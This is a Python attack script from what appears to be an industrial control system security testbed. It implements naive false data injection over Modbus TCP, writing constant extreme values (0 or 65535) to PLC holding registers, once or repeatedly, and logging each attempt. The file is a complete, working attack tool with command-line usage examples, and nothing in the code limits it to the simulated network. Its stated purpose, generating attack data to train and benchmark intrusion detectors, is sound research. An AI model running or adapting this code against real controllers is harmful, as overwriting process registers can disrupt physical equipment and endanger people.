#!/usr/bin/env python3
"""
ASCEND-PG attacks/naive_response_injection.py

Naive Response Injection (MITRE ATT&CK for ICS: T0836 — Modify Parameter).
Part of the False Data Injection (FDI) taxonomy from Morris & Gao (2013).

OVERVIEW:
Naive response injection is the baseline variant of False Data Injection.
The attacker writes constant, clearly out-of-range, or extreme values
(e.g., 0, 65535, or an unvarying static constant) directly to holding
registers of a target PLC over Modbus TCP (port 502).

Because Modbus TCP lacks authentication, any reachable host on the
control network can issue write requests. Naive injection does not attempt
to blend in or match physical process dynamics — the values are obvious
anomalies, making this attack relatively straightforward to detect via
threshold-based rules or IDS signatures. It serves as a benchmark baseline
for testing and training detection models (e.g., LSTM, Autoencoders, Suricata).

USAGE:
    # Single write of extreme value 65535 to register 0 on PLC plc1:
    python3 attacks/naive_response_injection.py --target 10.0.0.1 --address 0 --value 65535 --duration 0

    # Sustained injection of value 65535 every 1s for 10s:
    python3 attacks/naive_response_injection.py --target 10.0.0.1 --address 0 --value 65535 --duration 10.0 --interval 1.0

    # Zero-out multiple registers (0-4) sustained for 15s:
    python3 attacks/naive_response_injection.py --target 10.0.0.1 --address 0 --count 5 --value 0 --duration 15.0 --interval 1.0

    # Custom log store path:
    python3 attacks/naive_response_injection.py --target 10.0.0.1 --log /path/to/log_store.json

Run this ON THE ATTACKER HOST inside the Mininet topology (e.g., 10.0.0.66).
"""

import argparse
import json
import logging
import time
from datetime import datetime, timezone
from pathlib import Path

from pymodbus.client import ModbusTcpClient

# Shared event log store — repo data/ dir, anchored to this file (attacks/ ->
# repo root) so a standalone run resolves the same path the cycle runner uses.
DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"
MODBUS_PORT = 502
TECHNIQUE_ID = "T0836"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("naive_response_injection")


def log_event(log_path: Path, event: dict) -> None:
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def clamp_to_uint16(val: int) -> int:
    """Clamp integer to valid Modbus 16-bit unsigned register range [0, 65535]."""
    return max(0, min(65535, int(val)))


def run_naive_injection(
    target_ip: str,
    port: int = MODBUS_PORT,
    address: int = 0,
    value: int = 65535,
    count: int = 1,
    duration: float = 10.0,
    interval: float = 1.0,
    device_id: int = 1,
    log_path: Path = DEFAULT_LOG,
) -> dict:
    """Execute naive response injection against the target PLC.

    Writes a constant extreme/out-of-range value to one or more contiguous
    holding registers. If duration > 0, sustains the injection by repeating
    writes every `interval` seconds until duration expires.
    """
    target_value = clamp_to_uint16(value)
    client = ModbusTcpClient(target_ip, port=port, timeout=3)
    log.info(
        "Connecting to target PLC %s:%d (address=%d, count=%d, value=%d, duration=%.1fs, interval=%.1fs)...",
        target_ip,
        port,
        address,
        count,
        target_value,
        duration,
        interval,
    )

    if not client.connect():
        error_msg = f"Could not connect to target {target_ip}:{port}"
        log.error(error_msg)
        log_event(
            log_path,
            {
                "stage": "attack",
                "technique": TECHNIQUE_ID,
                "action": "naive_injection_error",
                "target": target_ip,
                "error": error_msg,
                "success": False,
            },
        )
        return {
            "target": target_ip,
            "writes_attempted": 0,
            "writes_succeeded": 0,
            "writes_failed": 1,
            "success": False,
        }

    writes_attempted = 0
    writes_succeeded = 0
    writes_failed = 0
    start_time = time.time()
    end_time = start_time + duration if duration > 0 else start_time

    try:
        while True:
            writes_attempted += 1
            if count == 1:
                result = client.write_register(
                    address=address,
                    value=target_value,
                    device_id=device_id,
                )
            else:
                result = client.write_registers(
                    address=address,
                    values=[target_value] * count,
                    device_id=device_id,
                )

            if result.isError():
                writes_failed += 1
                log.warning(
                    "Naive injection write #%d failed on %s:%d (addr=%d, count=%d): %s",
                    writes_attempted,
                    target_ip,
                    port,
                    address,
                    count,
                    result,
                )
                log_event(
                    log_path,
                    {
                        "stage": "attack",
                        "technique": TECHNIQUE_ID,
                        "action": "naive_injection",
                        "target": target_ip,
                        "address": address,
                        "count": count,
                        "injected_value": target_value,
                        "error": str(result),
                        "success": False,
                    },
                )
            else:
                writes_succeeded += 1
                log.info(
                    "Naive injection write #%d SUCCESS: %s:%d reg[%d..%d] = %d",
                    writes_attempted,
                    target_ip,
                    port,
                    address,
                    address + count - 1,
                    target_value,
                )
                log_event(
                    log_path,
                    {
                        "stage": "attack",
                        "technique": TECHNIQUE_ID,
                        "action": "naive_injection",
                        "target": target_ip,
                        "address": address,
                        "count": count,
                        "injected_value": target_value,
                        "success": True,
                    },
                )

            if duration <= 0 or time.time() >= end_time:
                break

            time.sleep(interval)

    finally:
        client.close()

    log.info(
        "Naive injection finished: %d attempted, %d succeeded, %d failed",
        writes_attempted,
        writes_succeeded,
        writes_failed,
    )
    return {
        "target": target_ip,
        "writes_attempted": writes_attempted,
        "writes_succeeded": writes_succeeded,
        "writes_failed": writes_failed,
        "success": writes_succeeded > 0,
    }


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Naive Response Injection Attack (MITRE T0836)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target PLC IP address (e.g., 10.0.0.1)",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=MODBUS_PORT,
        help="Target Modbus TCP port",
    )
    parser.add_argument(
        "-a",
        "--address",
        type=int,
        default=0,
        help="Starting holding register address (0-based)",
    )
    parser.add_argument(
        "-v",
        "--value",
        type=int,
        default=65535,
        help="Constant extreme value to inject (0..65535)",
    )
    parser.add_argument(
        "-c",
        "--count",
        type=int,
        default=1,
        help="Number of contiguous registers to overwrite",
    )
    parser.add_argument(
        "-d",
        "--duration",
        type=float,
        default=10.0,
        help="Duration in seconds to sustain the injection (0 for single write)",
    )
    parser.add_argument(
        "-i",
        "--interval",
        type=float,
        default=1.0,
        help="Seconds between injection writes",
    )
    parser.add_argument(
        "-u",
        "--unit",
        type=int,
        default=1,
        help="Modbus unit / device ID",
    )
    parser.add_argument(
        "--log",
        default=str(DEFAULT_LOG),
        help="Path to the shared event log store (defaults to <repo>/data/log_store.json)",
    )
    args = parser.parse_args()

    log_path = Path(args.log)
    run_naive_injection(
        target_ip=args.target,
        port=args.port,
        address=args.address,
        value=args.value,
        count=args.count,
        duration=args.duration,
        interval=args.interval,
        device_id=args.unit,
        log_path=log_path,
    )


if __name__ == "__main__":
    main()
